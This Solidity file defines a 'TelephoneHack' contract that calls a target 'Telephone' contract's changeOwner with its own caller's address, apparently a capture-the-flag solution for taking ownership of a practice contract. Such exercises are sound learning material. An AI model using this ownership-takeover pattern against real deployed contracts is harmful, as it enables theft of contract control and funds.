// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract TelephoneHack {
    address target;

    constructor(address _target) {
        target = _target;
    }

    function Hack() external {
        Telephone(target).changeOwner(msg.sender);
    }
}